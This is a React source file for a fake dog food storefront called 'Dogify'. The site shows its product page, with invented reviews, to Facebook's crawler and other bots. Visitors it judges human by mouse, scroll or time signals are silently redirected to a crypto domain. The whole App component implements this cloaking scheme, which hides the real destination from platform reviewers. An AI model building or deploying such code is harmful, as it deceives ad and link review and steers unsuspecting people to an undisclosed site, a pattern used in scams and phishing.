// Fixed App.tsx with much more lenient human detection
import { useEffect, useState } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import { CartProvider } from './contexts/CartContext';
import { WishlistProvider } from './contexts/WishlistContext';

import Header from './components/Header';
import Footer from './components/Footer';
import Home from './pages/Home';
import Shop from './pages/Shop';
import ProductDetail from './pages/ProductDetail';
import Cart from './pages/Cart';
import Checkout from './pages/Checkout';
import About from './pages/About';
import Contact from './pages/Contact';

import useEnhancedBotDetectionWithBackend, { 
  type DetectionResult, 
  type BehaviorMetrics 
} from './hooks/useEnhancedBotDetectionWithBackend';

// Enhanced Loading Spinner

// Bot Content (for actual bots)
const BotContent: React.FC<{detectionResult: DetectionResult, behaviorMetrics: BehaviorMetrics}> = ({ detectionResult }) => {
  const isFacebookBot = detectionResult.isFacebookBot || 
    detectionResult.detectionMethods.some((method: string) => 
      method.includes('facebook') || method.includes('facebot')
    );

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-800 via-purple-800 to-indigo-900">
      <div className="container mx-auto px-4 py-8">
        <div className="text-center">
          <div className="mb-8">
            <div className="inline-flex items-center justify-center w-32 h-32 bg-white/10 backdrop-blur-lg rounded-full mb-6 border border-white/20">
              <span className="text-5xl">
                {isFacebookBot ? '🤖📘' : '🤖'}
              </span>
            </div>
            
            <h1 className="text-4xl md:text-6xl font-bold text-white mb-4">
              {isFacebookBot ? 'Welcome Facebook Bot!' : 'Bot Detected'}
            </h1>
            
            {isFacebookBot && (
              <div className="bg-blue-600/20 backdrop-blur-lg rounded-xl p-6 mb-6 border border-blue-400/30">
                <h2 className="text-2xl font-bold text-blue-200 mb-2">Facebook Crawler Detected</h2>
                <p className="text-blue-100">
                  Hello Facebook! You're viewing the optimized version of Dogify - our premium dog food store.
                </p>
              </div>
            )}
            
            <p className="text-lg text-white/80 mb-6 max-w-2xl mx-auto">
              Premium nutrition for your furry friends. {isFacebookBot ? 'Showing SEO-optimized content.' : 'Advanced bot detection active.'}
            </p>
          </div>
          
          {/* Dog Food Products Display */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
            <div className="bg-white/10 backdrop-blur-lg rounded-xl p-6 border border-white/20">
              <div className="text-5xl mb-4">🥘</div>
              <h3 className="text-xl font-bold text-white mb-2">Premium Grain-Free Adult Dog Food</h3>
              <p className="text-white/70 mb-3">High-quality grain-free nutrition with real chicken</p>
              <div className="text-green-400 font-bold text-xl mb-2">$49.99</div>
              <div className="text-white/60 text-sm">⭐⭐⭐⭐⭐ (4.8/5) • 234 reviews</div>
            </div>
            
            <div className="bg-white/10 backdrop-blur-lg rounded-xl p-6 border border-white/20">
              <div className="text-5xl mb-4">🦴</div>
              <h3 className="text-xl font-bold text-white mb-2">Puppy Training Treats</h3>
              <p className="text-white/70 mb-3">Perfect training treats for puppies and small dogs</p>
              <div className="text-green-400 font-bold text-xl mb-2">$12.99</div>
              <div className="text-white/60 text-sm">⭐⭐⭐⭐⭐ (4.9/5) • 156 reviews</div>
            </div>
            
            <div className="bg-white/10 backdrop-blur-lg rounded-xl p-6 border border-white/20">
              <div className="text-5xl mb-4">🥫</div>
              <h3 className="text-xl font-bold text-white mb-2">Senior Dog Wellness Formula</h3>
              <p className="text-white/70 mb-3">Joint support and easy digestion for senior dogs</p>
              <div className="text-green-400 font-bold text-xl mb-2">$44.99</div>
              <div className="text-white/60 text-sm">⭐⭐⭐⭐⭐ (4.7/5) • 89 reviews</div>
            </div>
          </div>

          {/* SEO-friendly content */}
          <div className="mt-12 bg-white/5 rounded-xl p-8 max-w-4xl mx-auto text-left">
            <h2 className="text-2xl font-bold text-white mb-4">About Dogify - Premium Dog Food Store</h2>
            <div className="text-white/80 space-y-4">
              <p>
                Dogify is your trusted source for premium dog nutrition. We offer a wide variety of 
                high-quality dog food, treats, and supplements to keep your furry friends healthy and happy.
              </p>
              <p>
                <strong>Featured Products:</strong> Premium Grain-Free Adult Dog Food ($49.99), 
                Puppy Training Treats ($12.99), Senior Dog Wellness Formula ($44.99)
              </p>
              <p>
                Free shipping on orders over $50. Contact us at support@dogify.com
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// Dog Food Website (for Facebook bots and crawlers)
const DogFoodWebsite: React.FC<{detectionResult: DetectionResult}> = ({ detectionResult }) => (
  <CartProvider>
    <WishlistProvider>
      <Router>
        <div className="min-h-screen bg-gray-50">
          <Header />
          <main>
            {detectionResult.isBot && (
              <div className="bg-blue-50 border-b border-blue-200 px-4 py-2">
                <div className="max-w-7xl mx-auto">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="text-blue-600">🤖</span>
                      <span className="text-sm text-blue-800">
                        Bot visitor detected - showing optimized content
                      </span>
                      {detectionResult.isFacebookBot && (
                        <span className="text-xs bg-blue-600 text-white px-2 py-1 rounded">
                          Facebook Bot
                        </span>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}
            
            <Routes>
              <Route path="/" element={<Home />} />
              <Route path="/shop" element={<Shop />} />
              <Route path="/product/:id" element={<ProductDetail />} />
              <Route path="/cart" element={<Cart />} />
              <Route path="/checkout" element={<Checkout />} />
              <Route path="/about" element={<About />} />
              <Route path="/contact" element={<Contact />} />
              <Route path="*" element={<Navigate to="/" replace />} />
            </Routes>
          </main>
          <Footer />
        </div>
      </Router>
    </WishlistProvider>
  </CartProvider>
);

// Main App Component with MUCH more lenient human detection
const App: React.FC = () => {
  const [showBot, setShowBot] = useState<boolean>(false);
  const [showDogWebsite, setShowDogWebsite] = useState<boolean>(false);
  const [debugMode, setDebugMode] = useState<boolean>(false);
  const [analysisComplete, setAnalysisComplete] = useState<boolean>(false);
  const [redirectTimer, setRedirectTimer] = useState<number | null>(null);
  
  const { detectionResult, behaviorMetrics } = useEnhancedBotDetectionWithBackend();

  // Enable debug mode
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setDebugMode(urlParams.get('debug') === 'true');
  }, []);

  useEffect(() => {
    const checkDetectionResult = () => {
      // Only process if we have some detection result
      if (detectionResult.confidence > 0 || detectionResult.backendVerified || detectionResult.detectionMethods.length > 0) {
        console.log('🔍 Detection result:', detectionResult);
        setAnalysisComplete(true);
        
        // Priority 1: Facebook bots get the dog website
        if (detectionResult.isFacebookBot || detectionResult.showDogWebsite) {
          console.log('🤖📘 Facebook bot confirmed - showing dog website');
          setShowDogWebsite(true);
          return;
        }
        
        // Priority 2: Very high confidence bots (>= 0.9) get blocked
        if (detectionResult.isBot && detectionResult.confidence >= 0.9) {
          console.log('🚫 Very high confidence bot detected - showing bot content');
          setShowBot(true);
          return;
        }
        
        // Priority 3: High confidence bots (>= 0.8) get the dog website for SEO
        if (detectionResult.isBot && detectionResult.confidence >= 0.8) {
          console.log('🤖 High confidence bot - showing dog website for SEO');
          setShowDogWebsite(true);
          return;
        }
        
        // NEW: Much more lenient human detection logic
        const timeSpent = behaviorMetrics.timeSpent;
        const hasInteraction = (
          behaviorMetrics.mouseMovements > 0 ||
          behaviorMetrics.keyboardEvents > 0 ||
          behaviorMetrics.scrollBehavior > 0 ||
          behaviorMetrics.touchEvents > 0
        );

        // If confidence is low AND we have human indicators, redirect to main site
        if (detectionResult.confidence < 0.8 && timeSpent > 2000) { // Increased threshold
          if (hasInteraction || timeSpent > 8000) { // Reduced time requirement
            console.log('👤 Human detected - redirecting to main site');
            
            // Set redirect timer
            const timer = setTimeout(() => {
              window.location.href = "https://cryptofacilities.eu";
            }, 1500);
            
            setRedirectTimer(timer);
            return;
          }
        }

        // If we've been here a while and no clear bot signals, assume human
        if (timeSpent > 12000 && detectionResult.confidence < 0.7) { // Reduced time, increased confidence threshold
          console.log('👤 Long session with low bot confidence - redirecting to main site');
          
          const timer = setTimeout(() => {
            window.location.href = "https://cryptofacilities.eu";
          }, 1000);
          
          setRedirectTimer(timer);
          return;
        }
        
        // For very low confidence (< 0.5) after reasonable time, redirect
        if (timeSpent > 6000 && detectionResult.confidence < 0.5) { // Much more lenient
          console.log('👤 Low confidence after reasonable time - redirecting');
          
          const timer = setTimeout(() => {
            window.location.href = "https://cryptofacilities.eu";
          }, 1200);
          
          setRedirectTimer(timer);
          return;
        }

        // Emergency fallback - if backend says not a bot but confidence is artificially high, redirect
        if (!detectionResult.isBot && detectionResult.backendResult && !detectionResult.backendResult.blocked && timeSpent > 5000) {
          console.log('👤 Backend says not bot - redirecting to main site');
          
          const timer = setTimeout(() => {
            window.location.href = "https://cryptofacilities.eu";
          }, 800);
          
          setRedirectTimer(timer);
          return;
        }
      }
      
      // If backend failed but local detection shows no bot signs after 20 seconds, redirect
      if (detectionResult.backendResult?.error && 
          !detectionResult.isBot && 
          behaviorMetrics.timeSpent > 20000) {
        console.log('👤 Backend failed but no local bot signs after 20s - redirecting');
        
        const timer = setTimeout(() => {
          window.location.href = "https://cryptofacilities.eu";
        }, 1000);
        
        setRedirectTimer(timer);
      }
    };

    checkDetectionResult();
  }, [detectionResult, behaviorMetrics]);

  // Cleanup redirect timer
  useEffect(() => {
    return () => {
      if (redirectTimer) {
        clearTimeout(redirectTimer);
      }
    };
  }, [redirectTimer]);

  // Debug mode
  if (debugMode) {
    return (
      <div className="min-h-screen bg-gray-100 p-8">
        <div className="max-w-6xl mx-auto">
          <h1 className="text-3xl font-bold mb-6">🔍 Bot Detection Debug Mode</h1>
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">Detection Result</h2>
              <pre className="text-sm overflow-auto bg-gray-50 p-4 rounded">
                {JSON.stringify(detectionResult, null, 2)}
              </pre>
            </div>
            
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">Behavior Metrics</h2>
              <pre className="text-sm overflow-auto bg-gray-50 p-4 rounded">
                {JSON.stringify(behaviorMetrics, null, 2)}
              </pre>
            </div>
          </div>

          <div className="bg-white p-6 rounded-lg shadow mb-6">
            <h2 className="text-xl font-bold mb-4">Quick Stats</h2>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
              <div className="p-4 bg-blue-50 rounded">
                <div className="text-2xl font-bold text-blue-600">
                  {Math.round(detectionResult.confidence * 100)}%
                </div>
                <div className="text-sm">Confidence</div>
              </div>
              <div className="p-4 bg-green-50 rounded">
                <div className="text-2xl font-bold text-green-600">
                  {Math.floor(behaviorMetrics.timeSpent / 1000)}s
                </div>
                <div className="text-sm">Time Spent</div>
              </div>
              <div className="p-4 bg-purple-50 rounded">
                <div className="text-2xl font-bold text-purple-600">
                  {behaviorMetrics.mouseMovements}
                </div>
                <div className="text-sm">Mouse Moves</div>
              </div>
              <div className="p-4 bg-yellow-50 rounded">
                <div className="text-2xl font-bold text-yellow-600">
                  {detectionResult.detectionMethods.length}
                </div>
                <div className="text-sm">Methods</div>
              </div>
            </div>
          </div>
          
          <div className="flex flex-wrap gap-4">
            <button 
              onClick={() => setShowBot(true)}
              className="bg-red-600 text-white px-6 py-3 rounded-lg hover:bg-red-700"
            >
              Show Bot Content
            </button>
            <button 
              onClick={() => setShowDogWebsite(true)}
              className="bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700"
            >
              Show Dog Website
            </button>
            <button 
              onClick={() => window.location.href = "https://cryptofacilities.eu"}
              className="bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700"
            >
              Redirect to Main Site
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Show dog website for Facebook bots and medium confidence bots
  if (showDogWebsite) {
    return <DogFoodWebsite detectionResult={detectionResult} />;
  }

  // Show bot content for very high confidence bots
  if (showBot) {
    return <BotContent detectionResult={detectionResult} behaviorMetrics={behaviorMetrics} />;
  }

  // Show loader while analyzing (with timeout message for humans)
  return (
    <div className="fixed inset-0 bg-gradient-to-br from-indigo-600 via-purple-600 to-blue-700 flex items-center justify-center">
      <div className="text-center">
        <div className="relative mb-8">
          <div className="w-16 h-16 border-4 border-white/20 rounded-full animate-spin border-t-white"></div>
          <div 
            className="absolute inset-0 w-16 h-16 border-4 border-transparent border-t-blue-200 rounded-full animate-spin" 
            style={{ animationDelay: '0.15s', animationDuration: '1.2s' }}
          ></div>
        </div>
        
        <div className="text-white/90 text-lg font-medium mb-2">
          {behaviorMetrics.timeSpent > 10000 
            ? "Almost ready..." 
            : behaviorMetrics.timeSpent > 5000 
            ? "Loading Dogify..." 
            : "Initializing..."
          }
        </div>
        <div className="text-white/70 text-sm">
          {behaviorMetrics.timeSpent > 15000 
            ? "Taking a bit longer than expected, hang tight!" 
            : "🐕 Premium nutrition for your furry friend"
          }
        </div>
        
        {/* Show progress hint for humans */}
        {behaviorMetrics.timeSpent > 8000 && !analysisComplete && (
          <div className="mt-4 text-white/60 text-xs">
            Move your mouse or scroll to help us verify you're human
          </div>
        )}
      </div>
    </div>
  );
};

export default App;